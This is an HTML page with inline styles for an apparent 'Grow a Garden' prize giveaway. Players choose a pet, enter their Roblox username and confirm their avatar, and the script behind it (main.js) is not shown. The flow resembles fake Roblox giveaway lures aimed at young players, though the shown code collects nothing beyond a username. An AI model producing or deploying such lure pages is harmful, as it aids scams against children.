<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Grow a Garden Prizes</title>
<script src="main.js" defer></script>
<style>
  * {
    box-sizing: border-box;
    font-family: Arial, Helvetica, sans-serif;
  }

  html, body {
    width: 100%;
    height: 100%;
    margin: 0;
  }

  body {
    background-image: url("background.png");
  }

  /* TRUE CENTER */
  .viewport {
    position: fixed;
    inset: 0;
    display: grid;
    place-items: center;
  }

  .screen {
    position: absolute;
    width: 380px;
    background: #121212;
    border-radius: 16px;
    padding: 28px;
    box-shadow: 0 20px 60px rgba(0,0,0,.6);
    text-align: center;
    color: white;
    opacity: 1;
    transform: scale(1);
    transition: opacity .35s ease, transform .35s ease;
  }

  .hidden {
    opacity: 0;
    pointer-events: none;
    transform: scale(.96);
  }

  h2 {
    margin: 0 0 20px;
    font-weight: 600;
  }

  .buttons, .row {
    display: flex;
    gap: 12px;
    justify-content: center;
  }

  button {
    background: #2f2f2f;
    border: none;
    color: white;
    padding: 12px 18px;
    border-radius: 10px;
    font-size: 16px;
    cursor: pointer;
    transition: background .2s, transform .1s;
  }

  button:hover { background: #3b3b3b; }
  button:active { transform: scale(.96); }

  input {
    width: 100%;
    padding: 14px;
    border-radius: 10px;
    border: none;
    outline: none;
    font-size: 16px;
    background: #1f1f1f;
    color: white;
    margin-bottom: 16px;
  }

  .avatar {
    width: 160px;
    height: 160px;
    border-radius: 16px;
    margin: 16px auto;
    background: #1f1f1f;
    object-fit: cover;
  }
</style>
</head>
<body>
<div class="viewport">
  <div id="screen1" class="screen">
    <h2>Choose a Prize</h2>
    <div class="buttons">
      <button onclick="next()"><img src="Bunny.png" alt="Bunny" style="width: 50px; height: 50px;"></button>
      <button onclick="next()"><img src="Racoon.png" alt="Racoon" style="width: 50px; height: 50px;"></button>
      <button onclick="next()"><img src="Penguin.png" alt="Penguin" style="width: 50px; height: 50px;"></button>
    </div>
  </div>
  <div id="screen2" class="screen hidden">
    <h2>Enter your Roblox username</h2>
    <input id="username" placeholder="Roblox username">
    <button onclick="lookup()">Continue</button>
  </div>
  <div id="screen3" class="screen hidden">
    <h2>Is this you?</h2>
    <img id="avatar" class="avatar">
    <div class="row">
      <button onclick="confirmYes()">Yes</button>
      <button onclick="back()">No</button>
    </div>
  </div>
</div>
</body>
</html>
